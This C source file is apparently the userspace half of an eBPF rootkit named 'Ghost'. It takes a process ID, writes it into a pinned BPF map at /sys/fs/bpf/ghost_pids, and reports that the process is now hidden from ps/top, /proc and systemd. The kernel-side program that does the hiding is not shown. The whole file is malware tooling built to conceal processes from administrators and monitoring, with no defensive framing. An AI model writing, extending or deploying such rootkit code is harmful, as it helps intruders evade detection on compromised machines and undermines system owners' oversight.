#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <bpf/bpf.h>
#include <unistd.h>

#define GHOST_MAP_PATH "/sys/fs/bpf/ghost_pids"

int main(int argc, char **argv) {
	if (argc != 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return 1;
	}

	int map_fd = bpf_obj_get(GHOST_MAP_PATH);
	if (map_fd < 0) {
		perror("Failed to access Ghost BPF map");
		return 1;
	}

	pid_t target_pid = atoi(argv[1]);
	int result = bpf_map_update_elem(map_fd, &target_pid, &target_pid, BPF_ANY);
	
	if (result == 0) {
		printf("[+] Process %d is now hidden from:\n", target_pid);
		printf("    - ps/top\n    - /proc\n    - systemd\n");
	} else {
		perror("Failed to hide process");
	}

	close(map_fd);
	return 0;
}